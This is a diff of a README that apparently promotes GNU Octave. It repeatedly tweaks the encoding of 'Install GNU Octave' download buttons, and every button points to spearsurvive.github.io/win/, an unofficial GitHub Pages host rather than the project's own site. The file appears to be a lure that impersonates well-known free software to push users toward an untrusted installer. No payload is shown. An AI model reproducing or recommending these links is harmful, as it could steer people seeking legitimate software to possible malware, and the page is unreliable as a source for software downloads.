@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU%20Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU+Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ GNU Octave is a free, open-source high-level programming language primarily inte
 
 <div align="center">
 
-[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU%20Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU+Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ GNU Octave is a free, open-source high-level programming language primarily inte
 
 <div align="center">
 
-[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU%20Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GNU Octave](https://img.shields.io/badge/⬇_Install_GNU+Octave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
